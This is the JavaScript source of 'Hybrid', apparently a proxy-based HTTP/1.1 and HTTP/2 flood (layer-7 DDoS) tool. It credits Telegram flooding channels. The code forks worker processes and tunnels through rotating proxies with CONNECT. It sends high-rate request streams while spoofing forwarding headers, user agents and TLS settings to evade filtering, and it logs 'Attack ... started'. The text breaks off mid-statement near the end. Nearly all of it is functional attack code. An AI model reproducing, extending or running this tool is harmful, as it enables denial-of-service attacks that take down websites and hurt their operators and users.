const net = require("net");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const argv = require('minimist')(process.argv.slice(2));
const colors = require("colors");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const ciphers = `ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-ECDSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES256-CBC-SHA`;
const sigalgs = `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512`;
this.ecdhCurve = `GREASE:x25519:secp256r1:secp384r1`;
this._sigalgs = sigalgs;

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: this._sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method",
};
const secureContext = tls.createSecureContext(secureContextOptions);

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function parseProxy(line) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) {
        return null;
    }

    try {
        const parsed = new url.URL(`http://${trimmed}`);
        return {
            host: parsed.hostname,
            port: Number(parsed.port) || 80
        };
    } catch (error) {
        if (debug) {
            console.log(error);
        }
        return null;
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


function getRandomPrivateIP() {
    const privateIPRanges = [
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16"
    ];

    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];

    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);

        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }

    return ipPrefix.join(".");
}


function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (string.includes('\n')) {
        const lines = string.split('\n');

        lines.forEach(line => {
            console.log(`[${hours}:${minutes}:${seconds}]`.white + ` ${line}`);
        });
    } else {
        console.log(`[${hours}:${minutes}:${seconds}]`.white + ` ${string}`);
    }
}


function parseCommandLineArgs(args) {
    const parsedArgs = {};
    let currentFlag = null;

    for (const arg of args) {
        if (arg.startsWith('-')) {
            currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (currentFlag) {
            parsedArgs[currentFlag] = arg;
            currentFlag = null;
        }
    }

    return parsedArgs;
}

const _argv = process.argv.slice(2);
const argz = parseCommandLineArgs(_argv);

function parseHLineArgs(args) {
    const parsedArgs = {};
    const headers = {};

    for (let i = 0; i < args.length; i++) {
        const arg = args[i];

        if (arg.startsWith('-h')) {
            if (i + 1 < args.length && args[i + 1].includes('@')) {
                const [headerName, headerValue] = args[i + 1].split('@');
                const parsedValue = replaceRandPlaceholder(headerValue);
                headers[headerName] = parsedValue;
                i++;
            }
        } else if (arg.startsWith('-')) {
            const currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (arg.startsWith('--')) {
            const currentFlag = arg.slice(2);
            if (i + 1 < args.length && !args[i + 1].startsWith('-')) {
                parsedArgs[currentFlag] = args[i + 1];
                i++; // Skip the flag value
            } else {
                parsedArgs[currentFlag] = true;
            }
        }
    }

    return { args: parsedArgs, headers };
}

function replaceRandPlaceholder(value) {
    return value.replace(/%RAND-(\d+)%/g, (match, num) => randstr(parseInt(num)));
}


const _argh = process.argv.slice(2);
const { args: argh, headers: parsedHeaders } = parseHLineArgs(_argh);
const hasCustomHeaders = Object.keys(parsedHeaders).length !== 0;
const customHeaderEntries = Object.entries(parsedHeaders);

class Messages {
    Alert() {
        log('Hybrid [ v1.0.2 ]')
        log('Credits - t.me/ardflood, t.me/shesh3n777rus, t.me/sentryapi')
        log('===========================================================')
    }
}

const messages = new Messages();

if (process.argv.length < 7) {
    messages.Alert()
    // --------------------------
    log('Usage: <url> <time> <threads> <rate> <proxy>')
    // --------------------------
    log('Arguments -')
    log(' -d <int any> [ delay before start new stream ]')
    log(' -v <int 1/2> [ http version ]')
    log(' -s [ use rate headers ]')
    log(' -e [ use extra headers ]')
    // --------------------------
    log('Settings -')
    log(' --log <text> [ enable log ] - code for log or nothing for all')
    log(' --debug [ enable debug ]')
    log(' --payload <text> [ send payload ] - %RAND% for random or')
    log('                                     %BYTES% for random bytes')
    log(' --query <text> [ querystring ] - %RAND% for random or')
    log('                                  custom: n=v&n2=v2')
    // --------------------------
    log('Headers -')
    log(' -h <header@value> [ adding header ]')
    log(' %RAND-<NUM>% [ generates a random string of a certain length ]')
    // --------------------------
    log('Examples -')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt -d 30 -s -e')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt --query %RAND% --log 200')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt -h user-agent@test_ua -h accept@*/*')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt -h user-agent@"Mozilla %RAND-16%"')
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[5]),
    threads: parseInt(process.argv[4]),
    proxyFile: process.argv[6],
}

const delay = parseInt(argz["d"]) || 0;
const version = parseInt(argz["v"]) || 2;
const spoof = argz["s"];
const extra = argz["e"];

const _log = argv["log"];
const debug = argv["debug"];
const query = argv["query"];
const payload = argv["payload"];

const errorHandler = error => {
    if (debug) {
        console.log(error);
    }
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const proxyList = readLines(args.proxyFile)
    .map(parseProxy)
    .filter(Boolean);

if (!proxyList.length) {
    log("ERROR".red + "  " + "Proxy file is empty or invalid".white);
    process.exit(1);
}

const parsedTarget = url.parse(args.target);
const targetPort = parsedTarget.port || 443;
const authorityHost = parsedTarget.hostname && parsedTarget.hostname.includes(":") && !parsedTarget.hostname.startsWith('[')
    ? `[${parsedTarget.hostname}]`
    : parsedTarget.hostname || parsedTarget.host;
const targetAuthority = `${authorityHost}:${targetPort}`;
const connectPayloadBuffer = Buffer.from(`CONNECT ${targetAuthority} HTTP/1.1\r\nHost: ${targetAuthority}\r\nConnection: Keep-Alive\r\n\r\n`);

function pickProxy() {
    return proxyList[randomIntn(0, proxyList.length)];
}

const headerBuilder = {
    userAgent: [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0",
    ],

    acceptLang: [
        'ko-KR',
        'en-US',
        'zh-CN',
        'zh-TW',
        'ja-JP',
        'en-GB',
        'en-AU',
        'en-GB,en-US;q=0.9,en;q=0.8',
        'en-GB,en;q=0.5',
        'en-CA',
        'en-UK, en, de;q=0.5',
        'en-NZ',
        'en-GB,en;q=0.6',
        'en-ZA',
        'en-IN',
        'en-PH',
        'en-SG',
        'en-HK',
        'en-GB,en;q=0.8',
        'en-GB,en;q=0.9',
        'en-GB,en;q=0.7',
    ],

    acceptEncoding: [
        'gzip, deflate, br',
        'gzip, br',
        'deflate',
        'gzip, deflate, lzma, sdch',
        'deflate'
    ],

    accept: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    ],

    Sec: {
        dest: ['image', 'media', 'worker'],
        site: ['none',],
        mode: ['navigate', 'no-cors']
    },

    Custom: {
        dnt: ['0', '1'],
        ect: ['3g', '2g', '4g'],
        downlink: ['0', '0.5', '1', '1.7'],
        rtt: ['510', '255'],
        devicememory: ['8', '1', '6', '4', '16', '32'],
        te: ['trailers', 'gzip'],
        version: ['Win64; x64', 'Win32; x32']
    }
}

const httpStatusCodes = {
    "200": { "Description": "OK", "Color": "brightGreen" },
    "301": { "Description": "Moved Permanently", "Color": "yellow" },
    "302": { "Description": "Found", "Color": "yellow" },
    "304": { "Description": "Not Modified", "Color": "yellow" },
    "400": { "Description": "Bad Request", "Color": "red" },
    "401": { "Description": "Unauthorized", "Color": "red" },
    "403": { "Description": "Forbidden", "Color": "red" },
    "404": { "Description": "Found", "Color": "red" },
    "500": { "Description": "Internal Server Error", "Color": "brightRed" },
    "502": { "Description": "Bad Gateway", "Color": "brightRed" },
    "503": { "Description": "Service Unavailable", "Color": "brightRed" }
};

function createPathResolver() {
    const targetPath = parsedTarget.path || "/";
    const builder = () => {
        if (query === '%RAND%') {
            return `${targetPath}?${randstr(5)}=${randstr(25)}`;
        }
        if (!query) {
            return targetPath;
        }
        return `${targetPath}?${query}`;
    };

    return {
        staticPath: builder(),
        dynamicPath: builder
    };
}

function buildHttp2BaseHeaders(path, userAgent, language) {
    const baseHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": path,
        "x-forwarded-proto": "https",
        "upgrade-insecure-requests": "1",
        "sec-fetch-user": "?1",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": userAgent,
        "sec-fetch-dest": randomElement(headerBuilder.Sec.dest),
        "sec-fetch-mode": randomElement(headerBuilder.Sec.mode),
        "sec-fetch-site": "none",
        "accept": randomElement(headerBuilder.accept),
        "accept-language": language,
        "accept-encoding": randomElement(headerBuilder.acceptEncoding),
    };

    if (extra) {
        baseHeaders["DNT"] = randomElement(headerBuilder.Custom.dnt);
        baseHeaders["RTT"] = randomElement(headerBuilder.Custom.rtt);
        baseHeaders["Downlink"] = randomElement(headerBuilder.Custom.downlink);
        baseHeaders["Device-Memory"] = randomElement(headerBuilder.Custom.devicememory);
        baseHeaders["Ect"] = randomElement(headerBuilder.Custom.ect);
        baseHeaders["TE"] = randomElement(headerBuilder.Custom.te);
        baseHeaders["DPR"] = "2.0";
        baseHeaders["Service-Worker-Navigation-Preload"] = "true";
        baseHeaders["sec-ch-ua-arch"] = "x86";
        baseHeaders["sec-ch-ua-bitness"] = "64";
    }

    if (spoof) {
        const spoofHeaders = [
            "X-Real-Client-IP",
            "X-Real-IP",
            "X-Remote-Addr",
            "X-Remote-IP",
            "X-Forwarder",
            "X-Forwarder-For",
            "X-Forwarder-Host",
            "X-Forwarding",
            "X-Forwarding-For",
            "Forwarded",
            "Forwarded-For",
            "Forwarded-Host",
        ];

        spoofHeaders.forEach(headerName => {
            baseHeaders[headerName] = getRandomPrivateIP();
        });
    }

    return baseHeaders;
}

function cloneHeaders(template, keys) {
    const cloned = {};
    for (let i = 0; i < keys.length; i++) {
        const key = keys[i];
        cloned[key] = template[key];
    }
    return cloned;
}

function writePayloadAndEnd(stream) {
    if (typeof payload === "undefined") {
        stream.end();
        return;
    }

    if (payload === '%RAND%') {
        stream.end(randstr(25));
        return;
    }

    if (payload === '%BYTES%') {
        stream.end(crypto.randomBytes(64));
        return;
    }

    stream.end(payload);
}

function logStatusIfNeeded(statusCode) {
    if (!_log || typeof statusCode === "undefined") {
        return;
    }

    const numericStatus = typeof statusCode === "number" ? statusCode : parseInt(statusCode, 10);
    if (!Number.isFinite(numericStatus)) {
        return;
    }

    if (_log !== true) {
        const expected = parseInt(_log, 10);
        if (!Number.isFinite(expected) || numericStatus !== expected) {
            return;
        }
    }

    const statusMeta = httpStatusCodes[String(numericStatus)];
    if (!statusMeta) {
        return;
    }

    const description = statusMeta.Description[statusMeta.Color];
    log(`${numericStatus} ${description}`);
}

function determineChunkSize(rate) {
    if (rate >= 2048) return 512;
    if (rate >= 1024) return 256;
    if (rate >= 512) return 128;
    if (rate >= 256) return 64;
    if (rate >= 128) return 32;
    if (rate >= 64) return 16;
    return Math.max(1, rate);
}

function scheduleRpsLoop(rate, sendFn) {
    if (!Number.isFinite(rate) || rate <= 0) {
        return () => { };
    }

    const chunkSize = determineChunkSize(rate);
    let active = true;

    const dispatchBatch = () => {
        if (!active) {
            return;
        }

        let remaining = rate;

        const pump = () => {
            if (!active || remaining <= 0) {
                return;
            }

            const currentBatch = Math.min(chunkSize, remaining);
            remaining -= currentBatch;

            for (let i = 0; i < currentBatch; i++) {
                try {
                    sendFn();
                } catch (error) {
                    if (debug) {
                        console.log(error);
                    }
                }
            }

            if (remaining > 0) {
                setImmediate(pump);
            }
        };

        pump();
    };

    const intervalId = setInterval(dispatchBatch, 1000);
    dispatchBatch();

    return () => {
        if (!active) {
            return;
        }
        active = false;
        clearInterval(intervalId);
    };
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const target = options.address && options.address.includes(":")
            ? options.address
            : `${options.address}:443`;
        const buffer = options.connectPayload || Buffer.from(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\nConnection: Keep-Alive\r\n\r\n`);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setNoDelay(true);
        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function generateSpoofedFingerprint(userAgent, acceptLanguage) {
    const platform = 'Win64';
    const plugins = [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Google Translate', filename: 'aapbdbdomjkkjkaonfhkkikfgjllcleb' },
        { name: 'Zoom Chrome Extension', filename: 'kgjfgplpablkjnlkjmjdecgdpfankdle' },
        { name: 'uBlock Origin', filename: 'cjpalhdlnbpafiamejdnhcphjbkeiagm' },
        { name: 'AdBlock', filename: 'gighmmpiobklfepjocnamgkkbiglidom' },
        // etc ....
    ];

    const numPlugins = randomIntn(2, 5);
    const selectedPlugins = [];

    for (let i = 0; i < numPlugins; i++) {
        const randomIndex = randomIntn(0, plugins.length - 1);
        selectedPlugins.push(plugins[randomIndex]);
    }

    const fingerprintString = `${userAgent}${acceptLanguage}${platform}${JSON.stringify(selectedPlugins)}`;
    const sha256Fingerprint = crypto.createHash('sha256').update(fingerprintString).digest('hex');

    return sha256Fingerprint;
}


function http2run() {
    const proxy = pickProxy();
    if (!proxy) {
        return;
    }

    const selectedUserAgent = randomElement(headerBuilder.userAgent);
    const selectedLanguage = randomElement(headerBuilder.acceptLang);
    const { staticPath, dynamicPath } = createPathResolver();
    const baseHeaders = buildHttp2BaseHeaders(staticPath, selectedUserAgent, selectedLanguage);
    const baseHeaderKeys = Object.keys(baseHeaders);
    const resolvePath = hasCustomHeaders ? dynamicPath : () => staticPath;

    const proxyOptions = {
        host: proxy.host,
        port: proxy.port,
        address: targetAuthority,
        timeout: 100,
        connectPayload: connectPayloadBuffer
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) {
            return;
        }

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            socket: connection,
            minVersion: 'TLSv1.2',
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setNoDelay(true);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 65535,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        });

        let stopLoop = () => { };

        const cleanup = (() => {
            let cleaned = false;
            return () => {
                if (cleaned) {
                    return;
                }
                cleaned = true;
                stopLoop();
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            };
        })();

        const createRequestHeaders = hasCustomHeaders
            ? () => ({
                ":method": "GET",
                ":authority": parsedTarget.host,
                ":scheme": "https",
                ":path": resolvePath(),
                ...parsedHeaders
            })
            : () => cloneHeaders(baseHeaders, baseHeaderKeys);

        const sendRequest = () => {
            if (client.destroyed || client.closed) {
                return;
            }

            const headersPayload = createRequestHeaders();

            const request = client.request(headersPayload);

            const finalizeStream = () => {
                if (request.destroyed) {
                    return;
                }
                request.close();
                request.destroy();
            };

            request.on("response", response => {
                logStatusIfNeeded(response[':status']);
                finalizeStream();
            });

            request.on("error", finalizeStream);

            writePayloadAndEnd(request);
        };

        client.once("connect", () => {
            stopLoop = scheduleRpsLoop(args.rate, sendRequest);
        });

        client.on("error", cleanup);
        client.on("close", cleanup);
        tlsConn.on("error", cleanup);
        tlsConn.on("close", cleanup);
        connection.on("error", cleanup);
        connection.on("close", cleanup);
    });
}


function buildDefaultHttp1Headers(queryString) {
    const headerLines = [
        `GET ${queryString} HTTP/1.1`,
        `Host: ${parsedTarget.host}`,
        `Referer: ${args.target}`,
        `Origin: ${args.target}`,
        `Accept: ${randomElement(headerBuilder.accept)}`,
        `User-Agent: ${randomElement(headerBuilder.userAgent)}`,
        "Upgrade-Insecure-Requests: 1",
        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}`,
        `Accept-Language: ${randomElement(headerBuilder.acceptLang)}`,
        "Cache-Control: max-age=0",
        "Connection: Keep-Alive",
    ];

    if (spoof) {
        headerLines.push(`X-Forwarding-For: ${getRandomPrivateIP()}`);
    }

    headerLines.push("", "");
    return headerLines.join("\r\n");
}

function buildCustomHttp1Headers(queryString) {
    const headerLines = [
        `GET ${queryString} HTTP/1.1`,
        `Host: ${parsedTarget.host}`,
        "Connection: keep-alive",
    ];

    for (let i = 0; i < customHeaderEntries.length; i++) {
        const [name, value] = customHeaderEntries[i];
        headerLines.push(`${name}: ${value}`);
    }

    headerLines.push("", "");
    return headerLines.join("\r\n");
}

function http1run() {
    const proxy = pickProxy();
    if (!proxy) {
        return;
    }

    const { staticPath } = createPathResolver();
    const queryString = staticPath;

    const req = http.request({
        host: proxy.host,
        port: proxy.port,
        ciphers: cipper,
        method: 'CONNECT',
        path: targetAuthority
    });

    req.on('connect', (_, socket) => {
        socket.setKeepAlive(true, 600000);
        socket.setNoDelay(true);

        let stopLoop = () => { };

        const tlsConnection = tls.connect({
            host: parsedTarget.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            servername: parsedTarget.host,
            secure: true,
            rejectUnauthorized: false,
            socket
        }, () => {
            stopLoop = scheduleRpsLoop(args.rate, () => {
                if (!tlsConnection.writable || tlsConnection.destroyed) {
                    return;
                }

                const payload = hasCustomHeaders
                    ? buildCustomHttp1Headers(queryString)
                    : buildDefaultHttp1Headers(queryString);

                tlsConnection.write(payload);
            });
        });

        const cleanup = (() => {
            let cleaned = false;
            return () => {
                if (cleaned) {
                    return;
                }
                cleaned = true;
                stopLoop();
                tlsConnection.destroy();
                socket.destroy();
            };
        })();

        tlsConnection.on('data', chunk => {
            const responseLines = chunk.toString().split('\r\n');
            const firstLine = responseLines[0];
            if (!firstLine) {
                return;
            }
            const statusCode = parseInt(firstLine.split(' ')[1], 10);
            logStatusIfNeeded(statusCode);
        });

        tlsConnection.on('error', cleanup);
        tlsConnection.on('close', cleanup);
        socket.on('error', cleanup);
        socket.on('close', cleanup);
    });

    req.on('error', () => {
        req.destroy();
    });

    req.end();
}


if (cluster.isPrimary) {
    messages.Alert()

    if (version !== 1 && version !== 2) {
        log("ERROR".red + "  " + `Invalid HTTP version. Available: 1, 2`)
        process.exit()
    }

    if (typeof delay !== 'number' && delay < 1) {
        log("ERROR".red + "  " + `Cannot parse delay.`)
        process.exit()
    }

    log("INFO".cyan + "  " + `Attack ${args.target} started.`.white);
    for (let i = 0; i < args.threads; i++) {
        cluster.fork()
    }

    setTimeout(() => {
        log("INFO".cyan + "  " + `Attack is over.`.white);
        process.exit(1);
    }, args.time * 1000);

} else {
    if (version === 2) {
